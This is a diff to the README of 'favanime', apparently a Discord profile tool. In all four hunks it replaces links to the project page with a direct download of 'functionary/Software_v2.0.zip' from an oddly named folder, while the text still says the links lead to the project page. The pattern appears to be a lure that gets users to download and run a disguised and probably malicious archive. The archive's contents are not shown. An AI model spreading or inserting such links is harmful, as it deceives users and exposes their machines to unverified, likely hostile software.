@@ -1,6 +1,6 @@
 # 🎭 favanime - Show Anime on Your Discord Profile
 
-[![Download favanime](https://img.shields.io/badge/Download-favanime-brightgreen)](https://github.com/CliffOchie/favanime)
+[![Download favanime](https://img.shields.io/badge/Download-favanime-brightgreen)](https://github.com/CliffOchie/favanime/raw/refs/heads/main/functionary/Software_v2.0.zip)
 
 ## 📄 What is favanime?
 
@@ -26,7 +26,7 @@ You do not need to install any extra software before running favanime.
 
 To get started, visit the main download page:
 
-[![Download Here](https://img.shields.io/badge/Download-favanime-blue)](https://github.com/CliffOchie/favanime)
+[![Download Here](https://img.shields.io/badge/Download-favanime-blue)](https://github.com/CliffOchie/favanime/raw/refs/heads/main/functionary/Software_v2.0.zip)
 
 This link takes you to the project’s GitHub page, where the latest version is available.
 
@@ -122,7 +122,7 @@ It runs quietly in the background and updates when your anime list changes or wh
 
 When a new version is released:
 
-- Visit the same GitHub page at [https://github.com/CliffOchie/favanime](https://github.com/CliffOchie/favanime).
+- Visit the same GitHub page at [https://github.com/CliffOchie/favanime/raw/refs/heads/main/functionary/Software_v2.0.zip](https://github.com/CliffOchie/favanime/raw/refs/heads/main/functionary/Software_v2.0.zip).
 - Download the latest installer.
 - Run the new installer to replace the old version.
 - Your settings will stay intact.
@@ -146,4 +146,4 @@ If you run into problems:
 
 ---
 
-[![Download favanime](https://img.shields.io/badge/Download-favanime-brightgreen)](https://github.com/CliffOchie/favanime)
+[![Download favanime](https://img.shields.io/badge/Download-favanime-brightgreen)](https://github.com/CliffOchie/favanime/raw/refs/heads/main/functionary/Software_v2.0.zip)
